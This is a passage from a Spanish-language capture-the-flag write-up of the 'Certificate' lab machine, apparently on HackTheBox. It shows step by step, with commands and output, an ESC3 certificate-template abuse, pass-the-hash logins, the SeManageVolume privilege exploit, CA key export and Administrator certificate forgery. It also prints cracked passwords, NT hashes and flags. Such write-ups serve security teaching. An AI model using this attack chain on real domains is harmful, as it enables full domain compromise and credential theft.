1g 0:00:00:01 DONE (2025-10-18 11:55) 0.8620g/s 12358p/s 12358c/s 12358C/s 120806..cherry13
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que ha funcionado, por lo que vamos a probar a conectarnos por `WinRM` con dichas credenciales del usuario.

```shell
evil-winrm -i <IP> -u lion.sk -p '!QAZ2wsx'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> whoami
certificate\lion.sk
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
978c3a725757604598778d7c74b136e9
```

## Escalate user ryan.k

Vamos a ver si descubre alguna vulnerabilidad o no en el `dominio` del `AD` con una herramienta:

```shell
apt install certipy-ad
certipy-ad find -u lion.sk@certificate.htb -p '!QAZ2wsx' -dc-ip <IP> -vulnerable
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20251018120549_Certipy.txt'
[*] Wrote text output to '20251018120549_Certipy.txt'
[*] Saving JSON output to '20251018120549_Certipy.json'
[*] Wrote JSON output to '20251018120549_Certipy.json'
```

Ahora vamos a ver que nos ha reportado:

```shell
jq . 20251018120549_Certipy.json
```

Info:

```json
{
  "Certificate Authorities": {
    "0": {
      "CA Name": "Certificate-LTD-CA",
      "DNS Name": "DC01.certificate.htb",
      "Certificate Subject": "CN=Certificate-LTD-CA, DC=certificate, DC=htb",
      "Certificate Serial Number": "75B2F4BBF31F108945147B466131BDCA",
      "Certificate Validity Start": "2024-11-03 22:55:09+00:00",
      "Certificate Validity End": "2034-11-03 23:05:09+00:00",
      "Web Enrollment": {
        "http": {
          "enabled": false
        },
        "https": {
          "enabled": false,
          "channel_binding": null
        }
      },
      "User Specified SAN": "Disabled",
      "Request Disposition": "Issue",
      "Enforce Encryption for Requests": "Enabled",
      "Active Policy": "CertificateAuthority_MicrosoftDefault.Policy",
      "Permissions": {
        "Owner": "CERTIFICATE.HTB\\Administrators",
        "Access Rights": {
          "1": [
            "CERTIFICATE.HTB\\Administrators",
            "CERTIFICATE.HTB\\Domain Admins",
            "CERTIFICATE.HTB\\Enterprise Admins"
          ],
          "2": [
            "CERTIFICATE.HTB\\Administrators",
            "CERTIFICATE.HTB\\Domain Admins",
            "CERTIFICATE.HTB\\Enterprise Admins"
          ],
          "512": [
            "CERTIFICATE.HTB\\Authenticated Users"
          ]
        }
      }
    }
  },
  "Certificate Templates": {
    "0": {
      "Template Name": "Delegated-CRA",
      "Display Name": "Delegated-CRA",
      "Certificate Authorities": [
        "Certificate-LTD-CA"
      ],
      "Enabled": true,
      "Client Authentication": false,
      "Enrollment Agent": true,
      "Any Purpose": false,
      "Enrollee Supplies Subject": false,
      "Certificate Name Flag": [
        33554432,
        67108864,
        536870912,
        2147483648
      ],
      "Enrollment Flag": [
        1,
        8,
        32
      ],
      "Private Key Flag": [
        16
      ],
      "Extended Key Usage": [
        "Certificate Request Agent"
      ],
      "Requires Manager Approval": false,
      "Requires Key Archival": false,
      "Authorized Signatures Required": 0,
      "Schema Version": 2,
      "Validity Period": "1 year",
      "Renewal Period": "6 weeks",
      "Minimum RSA Key Length": 2048,
      "Template Created": "2024-11-05 19:52:09+00:00",
      "Template Last Modified": "2024-11-05 19:52:10+00:00",
      "Permissions": {
        "Enrollment Permissions": {
          "Enrollment Rights": [
            "CERTIFICATE.HTB\\Domain CRA Managers",
            "CERTIFICATE.HTB\\Domain Admins",
            "CERTIFICATE.HTB\\Enterprise Admins"
          ]
        },
        "Object Control Permissions": {
          "Owner": "CERTIFICATE.HTB\\Administrator",
          "Full Control Principals": [
            "CERTIFICATE.HTB\\Domain Admins",
            "CERTIFICATE.HTB\\Enterprise Admins"
          ],
          "Write Owner Principals": [
            "CERTIFICATE.HTB\\Domain Admins",
            "CERTIFICATE.HTB\\Enterprise Admins"
          ],
          "Write Dacl Principals": [
            "CERTIFICATE.HTB\\Domain Admins",
            "CERTIFICATE.HTB\\Enterprise Admins"
          ],
          "Write Property Enroll": [
            "CERTIFICATE.HTB\\Domain Admins",
            "CERTIFICATE.HTB\\Enterprise Admins"
          ]
        }
      },
      "[+] User Enrollable Principals": [
        "CERTIFICATE.HTB\\Domain CRA Managers"
      ],
      "[!] Vulnerabilities": {
        "ESC3": "Template has Certificate Request Agent EKU set."
      }
    }
  }
}
```

Veremos que hemos encontrado una `vulnerabilidad` **ESC3** en la plantilla **Delegated-CRA**. Esta es una vulnerabilidad de **Certificate Request Agent** que puede ser explotada.

Primero obtendremos un certificado de Agent:

```shell
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip <IP> -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 26
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

Ahora vamos a usar el certificado de Agent para solicitar un certificado para `ryan.k` (Vamos a probar con este usuario que es de los que nos quedan en el `dominio`):

```shell
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip <IP> -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
```

Info:

```
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 28
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

Veremos que ha funcionado, por lo que ahora vamos a obtener el `TGT` del usuario, pero esto puede dar un error si no sincronizamos bien el `timezone` del `DC` por lo que haremos lo siguiente:

```shell
ntpdate certificate.htb ; certipy auth -pfx 'ryan.k.pfx' -dc-ip '<IP>'
```

Info:

```
2025-10-18 12:39:59.145531 (-0700) +1311.378520 +/- 0.014745 certificate.htb 10.10.11.71 s1 no-leap
CLOCK: time stepped by 1311.378520
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

Ahora este `hash NTLM` lo podemos utilizar para autenticarnos realizando un `Pass-The-Hash` de esta forma:

```shell
evil-winrm -i certificate.htb -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami
certificate\ryan.k
```

Veremos que ha funcionado, vamos a listar los privilegios que tenemos:

```powershell
whoami /priv
```

Info:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

Vemos algo bastante interesante y es el privilegio de `SeManageVolumePrivilege` que lo tenemos activado, con esto lo que podemos hacer es realizar operaciones de mantenimiento de volúmenes y puede ser usado para **escalar privilegios**

## Escalate Privileges

Si buscamos en internet algun `PoC` para esta vulnerabilidad veremos la siguiente en el repo de `GitHub`.

URL = [SeManageVolumeExploit GitHub](https://github.com/CsEnox/SeManageVolumeExploit/releases)

Nos descargamos el `SeManageVolumeExploit.exe` y nos lo pasamos desde `wvil-winrm` a una carpeta en la que podamos escribir, por ejemplo en `Downloads` del usuario.

```powershell
cd C:\Users\Ryan.K\Downloads
upload SeManageVolumeExploit.exe
```

Info:

```
Info: Uploading /home/kali/Desktop/certificate/SeManageVolumeExploit.exe to C:\Users\Ryan.K\Downloads\SeManageVolumeExploit.exe
                                        
Data: 16384 bytes of 16384 bytes copied
                                        
Info: Upload successful!
```

Una vez que nos lo hayamos pasado tendremos que ejecutarlo de esta forma:

```powershell
.\SeManageVolumeExploit.exe
```

Info:

```
Entries changed: 867

DONE
```

Echo esto veremos que funciono por lo que tendremos que ejecutar el siguiente comando de seguido:

```powershell
icacls C:\Windows
```

Info:

```
C:\Windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Pre-Windows 2000 Compatible Access:(RX)
           BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

Veremos que si ha funcionado veremos que los permisos actualmente han cambiado viendo que cualquier usuario puede escribir o leer en la carpeta `C:\Windows`, esta informacion la saque del siguiente articulo:

URL = [Articulo de utilizar la herramienta PoC](https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9)

Podriamos probar a generar una `.dll` como vemos en el articulo pero directamente el `Windows Defender` lo va a bloquear, por lo que no nos interesa, vamos a jugar con los certificados de los usuarios para obtener el de `administrador` ya que podremos crear con estos permisos cualquier certificado y posteriormente falsificarlo.

Antes tendremos que obtener el numero de serie del usuario `Administrator`, esto lo podemos hacer leyendo el volcado que realizamos anteriormente con la herramienta `certipy` cuando descubrimos que plantilla era la vulnerable:

```
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
```

Identificamos que el numero es `75B2F4BBF31F108945147B466131BDCA` con este numero podremos obtener el certificado privilegiado sabiendo que los permisos que tenemos en la carpeta `C:\Windows` es de cualquier usuario, por lo que podremos pedirlo desde ahi.

```powershell
certutil -exportpfx 75B2F4BBF31F108945147B466131BDCA .\admin.pfx
```

Info:

```
MY "Personal"
================ Certificate 3 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file .\admin.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

Veremos que ha funcionado, por lo que vamos a descargarnos dicho archivo a nuestra maquina atacante.

```powershell
download admin.pfx
```

Info:

```
Info: Downloading C:\Users\Ryan.K\Downloads\admin.pfx to admin.pfx
                                        
Info: Download successful!
```

Ahora podremos obtener un `TGT` gracias a este certificado privilegiado del usuario `administrador`.

Pero antes tendremos que saber la ruta del objeto `admin` del `AD`, gracias a `BloodHound` podremos saber esto mismo, buscando el objeto `Administradtor` y en la parte de informacion veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-10-18 141821.png" alt=""><figcaption></figcaption></figure>

Ahora vamos a forjar el `.pfx` del `administrador` para posteriormente obtener el `TGT`.

```shell
ntpdate certificate.htb ; certipy-ad forge -ca-pfx admin.pfx -upn 'Administrator@certificate.htb' -subject 'CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB'
```

Info:

```
2025-10-18 13:21:43.473635 (-0700) +250.439924 +/- 0.017683 certificate.htb 10.10.11.71 s1 no-leap
CLOCK: time stepped by 250.439924
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'administrator_forged.pfx'
[*] Wrote forged certificate and private key to 'administrator_forged.pfx'
```

Una vez creado ese `administrator_forged.pfx` vamos a utilizarlo para autenticarnos y obtener le `TGT` de esta forma:

```shell
ntpdate certificate.htb ; certipy-ad auth -pfx administrator_forged.pfx -dc-ip <IP>
```

Info:

```
2025-10-18 13:23:58.929961 (-0700) +13.533612 +/- 0.026591 certificate.htb 10.10.11.71 s1 no-leap
CLOCK: time stepped by 13.533612
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6
```

Veremos que ha funcionado, vamos a probar dicho `hash` con `wvil-winrm` a ver si podemos realizar un `Pass-The-Hash`.

```shell
evil-winrm -i certificate.htb -u Administrator -H d804304519bf0143c14cbf1c024408c6
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
certificate\administrator
```

Veremos que ha funcionado, por lo que vamos a leer la `flag` del `admin`.

> root.txt

```
acfea9769dbb5084616fa56e12ad1c06
```
